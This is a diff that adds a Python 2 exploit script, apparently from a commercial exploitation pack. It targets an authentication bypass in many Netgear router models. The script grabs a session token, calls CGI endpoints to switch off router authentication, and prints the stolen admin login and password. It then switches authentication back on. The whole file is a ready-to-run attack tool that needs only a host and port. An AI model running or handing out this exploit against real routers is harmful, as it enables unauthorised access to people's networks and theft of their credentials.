@@ -1,0 +1,66 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+import time
+
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+_name_   = 'd2sec_netgear_10'
+_vendor_ = 'netgear'
+_model_  = ['AC1450', 'D8500', 'DC112A', 'JNDR3000', 'LG2200D', 'R4500', 'R6200', 'R6250', 'R6300', 'R6400', 'R6700', 'R6900', 'R7000', 'R7100LG', 'R7300', 'R7900', 'R8000', 'R8300', 'R8500', 'WGR614v10', 'WN2500RPv2', 'WNDR3400v2', 'WNDR3700v3', 'WNDR4000', 'WNDR4500', 'WNR1000', 'WNR3500L']
+_vuln_   = 'Authentication Bypass Vulnerability'
+_cve_    = ''
+_ref_    = 'https://github.com/zer0yu/CVE_Request/blob/master/netgear/netgear_cgi_unauthorized_access_vulnerability.md'
+_port_   = 8080
+
+def pwnrouter(host,port=_port_):
+  try:
+    # Get token
+    url = "https://%s:%s/LGO_logout.htm" % (host,port)
+    response = requests.get(url, verify=False)
+    m = re.search('logout\.cgi\?id=(\S+)', response.text)    
+    if m is None:
+        print '[+] %s not vulnerable' % host
+        return
+    token = m.group(1).strip()
+    # Disable authentication
+    url = "https://%s:%s/genieDisableLanChanged.cgi?id=%s" % (host,port,token)
+    response = requests.post(url, verify=False)
+    time.sleep(1)
+    response = requests.post(url, verify=False)
+    # Get credentials
+    url = "https://%s:%s//MNU_accessPassword_recovered.htm" % (host,port)
+    response = requests.get(url, verify=False)
+    if (response.status_code == 200) and ('' in response.text):
+        print '[+] %s vulnerable' % host        
+        print '[+] %s authentication is disabled.' % (host)
+        m = re.search('<td class="MNUText" align="left">([^<]+)</td>.*<td class="MNUText" align="left">([^<]+)</td>', response.text, re.DOTALL)
+        if m is None:
+            print '[-] %s Credentials not available' % host
+        else:
+            print('[+] Login:%s\n[+] Password: %s'%(m.group(1),m.group(2)))
+        # Enable authentication
+        url = "https://%s:%s/geniemanual.cgi?id=%s" % (host,port,token)
+        response = requests.post(url, verify=False)
+        time.sleep(1)
+        response = requests.post(url, verify=False)
+        print '[+] %s authentication is enabled.' % (host)                                            
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
